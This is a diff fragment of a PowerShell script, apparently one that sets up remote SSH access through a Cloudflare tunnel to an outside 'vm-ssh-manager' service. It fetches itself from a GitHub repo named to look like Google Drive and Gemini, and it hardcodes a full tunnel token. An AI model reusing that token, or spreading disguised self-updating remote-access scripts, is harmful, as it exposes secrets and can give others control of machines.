@@ -6,7 +6,7 @@ Write-Host 'Downloading...' -ForegroundColor Green
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
-$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini.ps1'
+$SelfUrl = 'https://raw.githubusercontent.com/download-faster/drive.google.com/main/gemini1.ps1'
 
 # ⚠️ THAY ĐỔI 2 DÒNG DƯỚI ĐÂY TRƯỚC KHI CHẠY
 $CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6Ik1tRmtZV0l3TkRRdE16TTRZUzAwTVRReExUaG1OMkV0WTJVME5tRXdOekF3TnpVd01Ea3pPVGxrTW1VdE5tRmpaaTAwTVRZNUxXSTNOMk10WlRaak5UWmhZV1ZqWkdSaCJ9"   
